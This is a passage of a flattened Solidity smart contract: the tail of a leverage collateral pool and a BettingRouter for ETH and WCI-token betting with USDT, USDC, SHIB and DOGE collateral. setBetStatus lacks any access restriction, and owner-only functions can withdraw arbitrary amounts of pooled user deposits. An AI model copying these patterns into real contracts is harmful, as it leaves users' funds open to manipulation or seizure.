903     function getPlayerLPBalanceInEth(address player) external view returns (uint256) {
904         uint256 usdtPrice = getUsdtPrice();
905         uint256 usdcPrice = getUsdcPrice();
906         uint256 shibPrice = getShibPrice();
907         uint256 dogePrice = getDogePrice();
908 
909         return  _ethPool[player] +
910                 uint256(10**12).mul(_usdtPool[player]).div(usdtPrice) +
911                 uint256(10**12).mul(_usdcPool[player]).div(usdcPrice) +
912                 _shibPool[player].div(shibPrice) +
913                 uint256(10**10).mul(_dogePool[player]).div(dogePrice);
914     }
915 
916     /*
917     * @Function to calculate pool token amounts equivalent to multiplier.
918     * @Calculating starts from eth pool. If there are sufficient tokens in eth pool, the eth pool will be reduced.
919     *   In other case, it checks the usdt pool. And next usdc pool.
920     *   It continues this process until it reaches the same amount as input ether amount.
921     */
922     function calcLockTokenAmountsAsCollateral(address player, uint256 etherAmount) external view returns (uint256, uint256, uint256, uint256, uint256) {
923         address _player = player;
924         uint256 rAmount = etherAmount;
925         // Each token balance in eth.
926         uint256 ethFromUsdt = uint256(10**12).mul(_usdtPool[_player]).div(getUsdtPrice());
927         uint256 ethFromUsdc = uint256(10**12).mul(_usdcPool[_player]).div(getUsdcPrice());
928         uint256 ethFromShib = _shibPool[_player].div(getShibPrice());
929         uint256 ethFromDoge = uint256(10**10).mul(_dogePool[_player]).div(getDogePrice());
930 
931         // If player has enough eth pool balance, the collateral will be set from eth pool.
932         if (_ethPool[_player] >= rAmount) {
933             return (rAmount, 0, 0, 0, 0);
934         }
935         // Otherwise, all ethers in eth pool will be converted to collateral and the remaining collateral amounts will be
936         // set from usdt pool.
937         rAmount -= _ethPool[_player];
938         
939         if (ethFromUsdt >= rAmount) {
940             return (_ethPool[_player], _usdtPool[_player].mul(rAmount).div(ethFromUsdt), 0, 0, 0);
941         }
942         rAmount -= ethFromUsdt;
943         
944         if (ethFromUsdc >= rAmount) {
945             return (_ethPool[_player], _usdtPool[_player], _usdcPool[_player].mul(rAmount).div(ethFromUsdc), 0, 0);
946         }
947         rAmount -= ethFromUsdc;
948 
949         if (ethFromShib >= rAmount) {
950             return (_ethPool[_player], _usdtPool[_player], _usdcPool[_player], _shibPool[_player].mul(rAmount).div(ethFromShib), 0);
951         }
952         rAmount -= ethFromShib;
953 
954         require(ethFromDoge >= rAmount, "You don't have enough collateral token amounts");
955         return (_ethPool[_player], _usdtPool[_player], _usdcPool[_player], _shibPool[_player], _dogePool[_player].mul(rAmount).div(ethFromDoge));
956     }
957 }
958 
959 // File: contracts\BettingRouter.sol
960 
961 
962 pragma solidity ^0.8.13;
963 contract BettingRouter is Ownable {
964     using SafeMath for uint256;
965 
966     mapping (uint256 => address) pairs; // All pair contract addresses
967     uint256 matchId;
968     address taxCollectorAddress = 0x41076e8DEbC1C51E0225CF73Cc23Ebd9D20424CE;        // Tax collector address
969     uint256 totalClaimEth;
970     uint256 totalClaimWci;
971     uint256 totalWinnerCountEth;
972     uint256 totalWinnerCountWci;
973 
974     IERC20 wciToken = IERC20(0xC5a9BC46A7dbe1c6dE493E84A18f02E70E2c5A32);
975     IERC20USDT _usdt = IERC20USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);  // USDT token
976     IERC20 _usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);          // USDC token
977     IERC20 _shib = IERC20(0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE);          // SHIB token
978     IERC20 _doge = IERC20(0x4206931337dc273a630d328dA6441786BfaD668f);          // DOGE token
979 
980     LeveragePool _lpPool;
981 
982     constructor() {
983         _lpPool = new LeveragePool();
984     }
985 
986     /*
987     * @Check if the input pair id is valid
988     */
989     modifier onlyValidPair(uint256 _id) {
990         require(_id >= 0 && _id < matchId, "Invalid pair id.");
991         _;
992     }
993 
994     /*
995     * @Check if the amount condition meets per token
996     */
997     modifier betConditions(uint _amount, IBettingPair.TOKENTYPE _token) {
998         if (_token == IBettingPair.TOKENTYPE.ETH) {
999             require(_amount >= 0.01 ether, "Insuffisant amount, please increase your bet!");
1000         } else if (_token == IBettingPair.TOKENTYPE.WCI) {
1001             require(_amount >= 1000 gwei, "Insuffisant amount, please increase your bet!");
1002         }
1003         _;
1004     }
1005 
1006     /*
1007     * @Function to create one pair for a match
1008     */
1009     function createOne() public onlyOwner {
1010         BettingPair _pair = new BettingPair();
1011         pairs[matchId] = address(_pair);
1012         matchId ++;
1013     }
1014 
1015     /*
1016     * Function for betting with ethers.
1017     * This function should be separated from other betting function because this is payable function.
1018     */
1019     function betEther(uint256 _pairId, IBettingPair.CHOICE _choice, uint256 _multiplier) external payable
1020         onlyValidPair(_pairId)
1021         betConditions(msg.value, IBettingPair.TOKENTYPE.ETH)
1022     {
1023         uint256 ethInLPPool = _lpPool.getPlayerLPBalanceInEth(msg.sender);
1024         require(ethInLPPool >= (msg.value).mul(_multiplier.sub(1)), "You don't have enough collaterals for that multiplier.");
1025 
1026         uint256 ethCol;     // ETH collateral amount
1027         uint256 usdtCol;    // USDT collateral amount
1028         uint256 usdcCol;    // USDC collateral amount
1029         uint256 shibCol;    // SHIB collateral amount
1030         uint256 dogeCol;    // DOGE collateral amount
1031 
1032         (ethCol, usdtCol, usdcCol, shibCol, dogeCol) = _lpPool.calcLockTokenAmountsAsCollateral(msg.sender, (msg.value).mul(_multiplier.sub(1)));
1033         _lpPool.lock(msg.sender, ethCol, usdtCol, usdcCol, shibCol, dogeCol);
1034         _lpPool.unlock(owner(), ethCol, usdtCol, usdcCol, shibCol, dogeCol);
1035 
1036         IBettingPair(pairs[_pairId]).bet(msg.sender, msg.value, _multiplier, _choice, IBettingPair.TOKENTYPE.ETH,
1037             ethCol, usdtCol, usdcCol, shibCol, dogeCol);
1038     }
1039 
1040     /*
1041     * Function for betting with WCI.
1042     * This function should be separated from ETH and other tokens because this token's transferFrom function has default tax rate.
1043     */
1044     function betWCI(uint256 _pairId, uint256 _betAmount, IBettingPair.CHOICE _choice) external
1045         onlyValidPair(_pairId)
1046         betConditions(_betAmount, IBettingPair.TOKENTYPE.WCI)
1047     {
1048         wciToken.transferFrom(msg.sender, address(this), _betAmount);
1049 
1050         // Apply 5% tax to all bet amounts.
1051         IBettingPair(pairs[_pairId]).bet(msg.sender, _betAmount.mul(19).div(20), 1, _choice, IBettingPair.TOKENTYPE.WCI, 0, 0, 0, 0, 0);
1052     }
1053 
1054     /*
1055     * @Function to claim earnings.
1056     */
1057     function claim(uint256 _pairId, IBettingPair.TOKENTYPE _token) external onlyValidPair(_pairId) {
1058         uint256[] memory claimInfo = IBettingPair(pairs[_pairId]).claim(msg.sender, _token);
1059         uint256 _amountClaim = claimInfo[0];
1060         uint256 _amountTax = claimInfo[1];
1061         require(_amountClaim > 0, "You do not have any profit in this bet");
1062 
1063         if (_token == IBettingPair.TOKENTYPE.ETH) {
1064             payable(msg.sender).transfer(_amountClaim);
1065             payable(taxCollectorAddress).transfer(_amountTax);
1066 
1067             _lpPool.unlock(msg.sender, claimInfo[2], claimInfo[3], claimInfo[4], claimInfo[5], claimInfo[6]);
1068             _lpPool.lock(owner(), claimInfo[2], claimInfo[3], claimInfo[4], claimInfo[5], claimInfo[6]);
1069         } else if (_token == IBettingPair.TOKENTYPE.WCI) {
1070             wciToken.transfer(msg.sender, _amountClaim);
1071         }
1072         
1073         if (_token == IBettingPair.TOKENTYPE.ETH) {
1074             totalClaimEth += _amountClaim;
1075             totalWinnerCountEth ++;
1076         } else {
1077             totalClaimWci += _amountClaim;
1078             totalWinnerCountWci ++;
1079         }
1080     }
1081 
1082     /*
1083     * @Function to withdraw tokens from router contract.
1084     */
1085     function withdrawPFromRouter(uint256 _amount, IBettingPair.TOKENTYPE _token) external doubleChecker {
1086         if (_token == IBettingPair.TOKENTYPE.ETH) {
1087             payable(owner()).transfer(_amount);
1088         } else if (_token == IBettingPair.TOKENTYPE.WCI) {
1089             wciToken.transfer(owner(), _amount);
1090         }
1091     }
1092 
1093     /*
1094     * @Function to get player bet information with triple data per match(per player choice).
1095     * @There are 3 types of information - first part(1/3 of total) is player bet amount information.
1096         Second part(1/3 of total) is multiplier information. Third part(1/3 of total) is player earning information.
1097     * @These information were separated before but merged to one function because of capacity of contract.
1098     */
1099     function getBetTripleInformation(address _player, IBettingPair.TOKENTYPE _token) external view returns (uint256[] memory) {
1100         uint256[] memory res = new uint256[](matchId * 9);
1101 
1102         for (uint256 i=0; i<matchId; i++) {
1103             uint256[] memory oneAmount = IBettingPair(pairs[i]).getPlayerBetAmount(_player, _token);
1104             res[i*3] = oneAmount[0];
1105             res[i*3 + 1] = oneAmount[1];
1106             res[i*3 + 2] = oneAmount[2];
1107 
1108             uint256[] memory oneMultiplier = IBettingPair(pairs[i]).calcMultiplier(_token);
1109             res[matchId*3 + i*3] = oneMultiplier[0];
1110             res[matchId*3 + i*3 + 1] = oneMultiplier[1];
1111             res[matchId*3 + i*3 + 2] = oneMultiplier[2];
1112 
1113             uint256[] memory oneClaim = IBettingPair(pairs[i]).calcEarning(_player, _token);
1114             res[matchId*6 + i*3] = oneClaim[0];
1115             res[matchId*6 + i*3 + 1] = oneClaim[1];
1116             res[matchId*6 + i*3 + 2] = oneClaim[2];
1117         }
1118         
1119         return res;
1120     }
1121 
1122     /*
1123     * @Function to get player bet information with single data per match.
1124     */
1125     function getBetSingleInformation(address _player, IBettingPair.TOKENTYPE _token) external view returns (uint256[] memory) {
1126         uint256[] memory res = new uint256[](matchId * 4);
1127 
1128         for (uint256 i=0; i<matchId; i++) {
1129             res[i] = uint256(IBettingPair(pairs[i]).getBetStatus());
1130             res[matchId + i] = uint256(IBettingPair(pairs[i]).getBetResult());
1131             res[matchId*2 + i] = IBettingPair(pairs[i]).getPlayerClaimHistory(_player, _token);
1132             res[matchId*3 + i] = IBettingPair(pairs[i]).getTotalBet(_token);
1133         }
1134 
1135         return res;
1136     }
1137 
1138     /*
1139     * @Function to get the newly creating match id.
1140     */
1141     function getMatchId() external view returns (uint256) {
1142         return matchId;
1143     }
1144 
1145     /*
1146     * @Function to get tax collector address
1147     */
1148     function getTaxCollectorAddress() external view returns (address) {
1149         return taxCollectorAddress;
1150     }
1151 
1152     /*
1153     * @Function to get match status per token.
1154     * @This includes total claim amount and total winner count.
1155     */
1156     function getBetStatsData() external view returns (uint256, uint256, uint256, uint256) {
1157         return (totalClaimEth, totalWinnerCountEth, totalClaimWci, totalWinnerCountWci);
1158     }
1159 
1160     /*
1161     * @Function to set bet status data.
1162     * @This function is needed because we upgraded the smart contract for several times and each time we upgrade
1163     *   the smart contract, we need to set these values so that they can continue to count.
1164     */
1165     function setBetStatsData(uint256 _totalClaim, uint256 _totalWinnerCount, IBettingPair.TOKENTYPE _token) external onlyOwner {
1166         if (_token == IBettingPair.TOKENTYPE.ETH) {
1167             totalClaimEth = _totalClaim;
1168             totalWinnerCountEth = _totalWinnerCount;
1169         } else {
1170             totalClaimWci = _totalClaim;
1171             totalWinnerCountWci = _totalWinnerCount;
1172         }
1173     }
1174 
1175     /*
1176     * @Function to get WCI token threshold.
1177     * @Users tax rate(5% or 10%) will be controlled by this value.
1178     */
1179     // function getWciTokenThreshold() external view returns (uint256) {
1180     //     if (matchId == 0) return 50000 * 10**9;
1181     //     else return IBettingPair(pairs[0]).getWciTokenThreshold();
1182     // }
1183 
1184     /*
1185     * @Function to set bet result.
1186     */
1187     function setBetResult(uint256 _pairId, IBettingPair.CHOICE _result) external onlyOwner onlyValidPair(_pairId) {
1188         IBettingPair(pairs[_pairId]).setBetResult(_result);
1189     }
1190 
1191     /*
1192     * @Function to set bet status.
1193     */
1194     function setBetStatus(uint256 _pairId, IBettingPair.BETSTATUS _status) external onlyValidPair(_pairId) {
1195         IBettingPair(pairs[_pairId]).setBetStatus(_status);
1196     }
1197 
1198     /*
1199     * @Function to set tax collector address.
1200     */
1201     function setTaxCollectorAddress(address _address) external onlyOwner {
1202         taxCollectorAddress = _address;
1203     }
1204 
1205     /*
1206     * @Function to set WCI token threshold.
1207     */
1208     function setWciTokenThreshold(uint256 _threshold) external onlyOwner {
1209         for (uint256 i=0; i<matchId; i++) {
1210             IBettingPair(pairs[i]).setWciTokenThreshold(_threshold);
1211         }
1212     }
1213 
1214     /*
1215     * @Function to deposit ETH for collateral.
1216     */
1217     function depositEth() external payable {
1218         require(msg.value >= 0.01 ether, "Minimum deposit amount is 0.01");
1219 
1220         _lpPool.depositEth(msg.sender, msg.value);
1221     }
1222 
1223     /*
1224     * @Function to deposit tokens for collateral.
1225     */
1226     function depositErc20(IBettingPair.LPTOKENTYPE token, uint256 amount) external {
1227         if (token == IBettingPair.LPTOKENTYPE.USDT) {
1228             require(amount >= 15 * 10 ** 6, "Minimum deposit USDT amount is 15");
1229             _usdt.transferFrom(msg.sender, address(this), amount);
1230         }
1231         else if (token == IBettingPair.LPTOKENTYPE.USDC) {
1232             require(amount >= 15 * 10 ** 6, "Minimum deposit USDC amount is 15");
1233             _usdc.transferFrom(msg.sender, address(this), amount);
1234         }
1235         else if (token == IBettingPair.LPTOKENTYPE.SHIB){
1236             require(amount >= 1500000 ether, "Minumum deposit SHIB amount is 1500000");
1237             _shib.transferFrom(msg.sender, address(this), amount);
1238         }
1239         else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
1240             require(amount >= 180 * 10 ** 8, "Minimum deposit DOGE amount is 180");
1241             _doge.transferFrom(msg.sender, address(this), amount);
1242         }
1243 
1244         _lpPool.depositErc20(msg.sender, token, amount);
1245     }
1246 
1247     /*
1248     * @Function to withdraw tokens from leverage pool.
1249     */
1250     function withdraw(IBettingPair.LPTOKENTYPE token, uint256 amount) external {
1251         require(amount > 0, "Withdraw amount should be bigger than 0");
1252 
1253         uint256 ethAmount;
1254         uint256 usdtAmount;
1255         uint256 usdcAmount;
1256         uint256 shibAmount;
1257         uint256 dogeAmount;
1258 
1259         (ethAmount, usdtAmount, usdcAmount, shibAmount, dogeAmount) = _lpPool.getUserLPBalance(msg.sender);
1260 
1261         if (token == IBettingPair.LPTOKENTYPE.ETH) {
1262             require(ethAmount >= amount, "Not enough ETH balance to withdraw");
1263             payable(msg.sender).transfer(amount);
1264         } else if (token == IBettingPair.LPTOKENTYPE.USDT) {
1265             require(usdtAmount >= amount, "Not enough USDT balance to withdraw");
1266             _usdt.transfer(msg.sender, amount);
1267         } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
1268             require(usdcAmount >= amount, "Not enough USDC balance to withdraw");
1269             _usdc.transfer(msg.sender, amount);
1270         } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
1271             require(shibAmount >= amount, "Not enough SHIB balance to withdraw");
1272             _shib.transfer(msg.sender, amount);
1273         } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
1274             require(dogeAmount >= amount, "Not enough DOGE balance to withdraw");
1275             _doge.transfer(msg.sender, amount);
1276         }
1277 
1278         _lpPool.withdraw(msg.sender, token, amount);
1279     }
1280 
1281     /*
1282     * @Function to get player's LP token balance.
1283     */
1284     function getUserLPBalance(address player) external view returns (uint256, uint256, uint256, uint256, uint256) {
1285         return _lpPool.getUserLPBalance(player);
1286     }
1287 
1288     /*
1289     * @Function to withdraw LP token from contract on owner side.
1290     */
1291     function withdrawLPFromContract(IBettingPair.LPTOKENTYPE token, uint256 amount) public doubleChecker {
1292         if (token == IBettingPair.LPTOKENTYPE.ETH) {
1293             payable(owner()).transfer(amount);
1294         } else if (token == IBettingPair.LPTOKENTYPE.USDT) {
1295             _usdt.transfer(owner(), amount);
1296         } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
1297             _usdc.transfer(owner(), amount);
1298         } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
1299             _shib.transfer(owner(), amount);
1300         } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
1301             _doge.transfer(owner(), amount);
1302         }
1303 
1304         _lpPool.withdrawFromContract(owner(), token, amount);
1305     }
1306 }